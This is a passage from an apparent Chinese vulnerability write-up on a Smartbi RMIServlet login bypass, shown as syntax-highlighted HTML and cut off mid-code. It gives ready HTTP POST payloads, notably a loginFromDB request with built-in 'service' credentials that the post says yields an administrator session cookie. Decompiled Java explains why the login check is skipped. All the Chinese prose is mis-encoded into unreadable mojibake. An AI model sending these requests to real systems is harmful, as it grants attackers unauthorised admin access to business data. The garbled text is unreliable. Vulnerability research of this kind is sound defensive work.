<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[] ret </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[obufcount]</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">arraycopy</span><span style="color: #ABB2BF">(obuf, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, ret, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, obufcount);</span></span>
<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> ret</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">    }</span></span>
<span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure></li>
</ol>
<p><strong>ç›´æ¥ä¼ è¾“</strong></p>
<figure class="shiki shell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">POST</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/smartbi/vision/RMIServlet</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">HTTP/1.1</span></span>
<span class="line"><span style="color: #61AFEF">Host:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">127.0</span><span style="color: #98C379">.0.1:18080</span></span>
<span class="line"><span style="color: #61AFEF">User-Agent:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Mozilla/5.0</span><span style="color: #ABB2BF"> (Windows </span><span style="color: #98C379">NT</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10.0</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">Win64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">x64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">rv:136.0</span><span style="color: #ABB2BF">) Gecko/20100101 Firefox/136.0</span></span>
<span class="line"><span style="color: #61AFEF">Content-Type:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">application/x-www-form-urlencoded</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">charset</span><span style="color: #56B6C2">=</span><span style="color: #98C379">UTF-8</span></span>
<span class="line"><span style="color: #61AFEF">Accept:</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">*</span><span style="color: #98C379">/</span><span style="color: #E5C07B">*</span></span>
<span class="line"><span style="color: #61AFEF">Origin:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">http://127.0.0.1</span></span>
<span class="line"><span style="color: #61AFEF">Referer:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">http://127.0.0.1:18080/smartbi/vision/index.jsp</span></span>
<span class="line"><span style="color: #61AFEF">Accept-Encoding:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">gzip,</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">deflate,</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">br</span></span>
<span class="line"><span style="color: #61AFEF">Accept-Language:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">zh-CN,zh</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.9</span><span style="color: #98C379">,en</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.8</span></span>
<span class="line"><span style="color: #61AFEF">Cookie:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">JSESSIONID=D451AE905A8C9424DE83D2C921A73D4F</span></span>
<span class="line"><span style="color: #61AFEF">Connection:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">keep-alive</span></span>
<span class="line"><span style="color: #E06C75">className</span><span style="color: #56B6C2">=</span><span style="color: #98C379">UserService</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">methodName</span><span style="color: #56B6C2">=</span><span style="color: #98C379">login</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">params</span><span style="color: #56B6C2">=</span><span style="color: #98C379">[&quot;admin&quot;,&quot;admin&quot;]</span></span></code></pre></div></div></figure>

<p>å°†RMIServletè§£å¯†åçš„ä¸‰ä¸ªå­—ç¬¦ä¸²ï¼Œåˆ†åˆ«ä¼ è¾“åˆ° classNam e ã€ methodName å’Œ params å‚æ•°ä¸­</p>
<h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><h2 id="å†…ç½®ç”¨æˆ·ç™»é™†ç»•è¿‡"><a href="#å†…ç½®ç”¨æˆ·ç™»é™†ç»•è¿‡" class="headerlink" title="å†…ç½®ç”¨æˆ·ç™»é™†ç»•è¿‡"></a>å†…ç½®ç”¨æˆ·ç™»é™†ç»•è¿‡</h2><p>å®‰è£…æ—¶ä¼šäº§ç”Ÿå†…ç½®ç”¨æˆ·ï¼Œä»¥ç‰¹å®šæ¥å£ï¼Œç»•è¿‡â½¤æˆ·èº«ä»½è®¤è¯æœºåˆ¶ï¼Œè¿›è€Œè·å¾—èº«ä»½å‡­è¯ï¼Œéšåå¯ä½¿â½¤è·å–çš„èº«ä»½å‡­è¯è°ƒâ½¤åå°æ¥â¼ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²å’Œä»£ç æ‰§è¡Œ</p>
<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">POST </span><span style="color: #56B6C2">/</span><span style="color: #E06C75">smartbi</span><span style="color: #56B6C2">/</span><span style="color: #E06C75">vision</span><span style="color: #56B6C2">/</span><span style="color: #E5C07B">RMIServlet</span><span style="color: #E06C75"> HTTP</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">1.1</span></span>
<span class="line"><span style="color: #E06C75">Host</span><span style="color: #C678DD">:</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">x</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">x</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">x</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">x</span></span>
<span class="line"><span style="color: #E06C75">User</span><span style="color: #56B6C2">-</span><span style="color: #E06C75">Agent</span><span style="color: #C678DD">:</span><span style="color: #E06C75"> Mozilla</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">5.0</span><span style="color: #E06C75"> (Macintosh</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Intel</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Mac</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">OS</span><span style="color: #E06C75"> X </span><span style="color: #D19A66">10_14_3</span><span style="color: #E06C75">) AppleWebKit</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">60</span></span>
<span class="line"><span style="color: #D19A66">5.1</span><span style="color: #ABB2BF">.</span><span style="color: #FFFFFF">15</span><span style="color: #E06C75"> (KHTML</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> like Gecko) Version</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">12.0</span><span style="color: #ABB2BF">.</span><span style="color: #FFFFFF">3</span><span style="color: #E06C75"> Safari</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">605.1</span><span style="color: #ABB2BF">.</span><span style="color: #FFFFFF">15</span></span>
<span class="line"><span style="color: #E06C75">Content</span><span style="color: #56B6C2">-</span><span style="color: #E06C75">Type</span><span style="color: #C678DD">:</span><span style="color: #E06C75"> application</span><span style="color: #56B6C2">/</span><span style="color: #E06C75">x</span><span style="color: #56B6C2">-</span><span style="color: #E06C75">www</span><span style="color: #56B6C2">-</span><span style="color: #E06C75">form</span><span style="color: #56B6C2">-</span><span style="color: #E06C75">urlencoded</span></span>
<span class="line"><span style="color: #E06C75">Accept</span><span style="color: #56B6C2">-</span><span style="color: #E06C75">Encoding</span><span style="color: #C678DD">:</span><span style="color: #E06C75"> gzip</span></span>
<span class="line"><span style="color: #E06C75">Content</span><span style="color: #56B6C2">-</span><span style="color: #E06C75">Length</span><span style="color: #C678DD">:</span><span style="color: #E06C75"> </span><span style="color: #D19A66">68</span></span>
<span class="line"><span style="color: #E06C75">className</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">UserService</span><span style="color: #56B6C2">&amp;</span><span style="color: #E06C75">methodName</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">loginFromDB</span><span style="color: #56B6C2">&amp;</span><span style="color: #E06C75">params</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">[</span><span style="color: #98C379">&quot;service&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&quot;0a&quot;</span><span style="color: #E06C75">]</span></span></code></pre></div></div></figure>

<p>è§£å¯†å¾—åˆ°çš„ä¸‰ä¸ªå‚æ•°</p>
<h4 id="payloadï¼š"><a href="#payloadï¼š" class="headerlink" title="payloadï¼š"></a><strong>payloadï¼š</strong></h4><p>ç»“æœè¿”å›trueâ€”â€”â€”â€”â€”&gt;ç›´æ¥åˆ©ç”¨set-cookieç™»å½•åå°å³å¯è·å–ç®¡ç†å‘˜æƒé™</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173420964.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="æ¼æ´åˆ†æï¼š"><a href="#æ¼æ´åˆ†æï¼š" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a><strong>æ¼æ´åˆ†æï¼š</strong></h4><ol>
<li><p>è®¿é—®é¡¹ç›®çš„web.xmlï¼ŒæŸ¥çœ‹è®¿é—®&#x2F;vision&#x2F;RMIServletçš„è¿‡æ»¤ ï¼ˆCheckIsLoggedFilterï¼‰</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173422702.png" srcset="/img/loading.gif" lazyload alt="image-20250811182130105"></p>
</li>
<li><p>Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\filter\CheckIsLoggedFilter.class</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173424539.png" srcset="/img/loading.gif" lazyload alt="image-20250811210548785"></p>
<p>needToCheck â½…æ³•å¯¹ä¼ â¼Šçš„ ç±»åå’Œâ½…æ³•å è¿›â¾æ£€æŸ¥ï¼Œåˆ¤æ–­æ˜¯å¦éœ€è¦è¿›â¾ç™»å½• æ£€æŸ¥</p>
</li>
<li><p>æŸ¥çœ‹needToCheck</p>
<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #C678DD">boolean</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">needToCheck</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> className</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> methodName) {</span></span>
<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #56B6C2">!</span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isNullOrEmpty</span><span style="color: #ABB2BF">(className)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">!</span><span style="color: #E5C07B">className</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;BIConfigService&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">className</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;UserService&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isInArray</span><span style="color: #ABB2BF">(methodName, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;login&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;loginFor&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;clickLogin&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;loginFromDB&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;logout&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;isLogged&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;isLoginAs&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;checkVersion&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;hasLicense&quot;</span><span style="color: #ABB2BF">})</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">            } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">className</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;CompositeService&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isInArray</span><span style="color: #ABB2BF">(methodName, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;compositeLogin&quot;</span><span style="color: #ABB2BF">})</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">            } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">className</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;BusinessViewService&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isInArray</span><span style="color: #ABB2BF">(methodName, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;closeBusinessView&quot;</span><span style="color: #ABB2BF">})</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">            } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">className</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;DataSourceService&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isInArray</span><span style="color: #ABB2BF">(methodName, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;clearClientData&quot;</span><span style="color: #ABB2BF">})</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">            } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">className</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;MDSService&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isInArray</span><span style="color: #ABB2BF">(methodName, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;getDefaultEncryptType&quot;</span><span style="color: #ABB2BF">})</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">            } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">className</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;MDSService&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isInArray</span><span style="color: #ABB2BF">(methodName, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;getOAMSURL&quot;</span><span style="color: #ABB2BF">})</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">            } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">className</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;DPPortalService&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isInArray</span><span style="color: #ABB2BF">(methodName, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;removePageBO&quot;</span><span style="color: #ABB2BF">})</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">            } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">methodName</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;login&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">            } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">className</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;CommonService&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isInArray</span><span style="color: #ABB2BF">(methodName, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;log&quot;</span><span style="color: #ABB2BF">})</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">            } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> {</span></span>
<span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">!</span><span style="color: #E5C07B">className</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;FingerTipsDataModule&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #E06C75">            }</span></span>
<span class="line"><span style="color: #E06C75">        } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> {</span></span>
<span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">        }</span></span>
<span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure>
</li>
<li><p>å¯»æ‰¾è°ƒç”¨ä¸‰ç§å‚æ•°çš„æ–¹å¼</p>
<p>RMIServlet çš„ doPost â½…æ³•ï¼Œæ¥å—ä¼ å‚ï¼Œé€šè¿‡ processExecute â½…æ³• è¿›â¾åå°„è°ƒâ½¤â½…æ³•</p>
<p>\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FrameworkRMI.jar!\smartbi\framework\rmi\RMIServlet.class</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173427621.png" srcset="/img/loading.gif" lazyload alt="image-20250811211750079"></p>
</li>
<li><p>è·Ÿè¿‘processExecute â½…æ³•</p>
<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">processExecute</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">HttpServletRequest</span><span style="color: #E06C75"> request</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> className</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> methodName</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> params) {</span></span>
<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">ClientService</span><span style="color: #E06C75"> service </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">RMIModule</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getService</span><span style="color: #ABB2BF">(className);</span><span style="color: #7F848E; font-style: italic">//ä¼šæ ¹æ® className æ¥å¯»æ‰¾å¯¹åº”çš„ ClinetService </span></span>
<span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> resultStr </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">try</span><span style="color: #E06C75"> {</span></span>
<span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">StringBuilder</span><span style="color: #E06C75"> buff </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">StringBuilder</span><span style="color: #E06C75">())</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">append</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;{&#39;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (service </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (className </span><span style="color: #56B6C2">!=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75">) {</span></span>
<span class="line"><span style="color: #E06C75">                    </span><span style="color: #E5C07B">Locale</span><span style="color: #E06C75"> locale </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">CommonConfiguration</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getLocale</span><span style="color: #ABB2BF">();</span></span>
<span class="line"><span style="color: #E06C75">                    </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> notFoundClass </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">replaceLanguage</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;${Notfoundclass}&quot;</span><span style="color: #ABB2BF">, locale);</span></span>
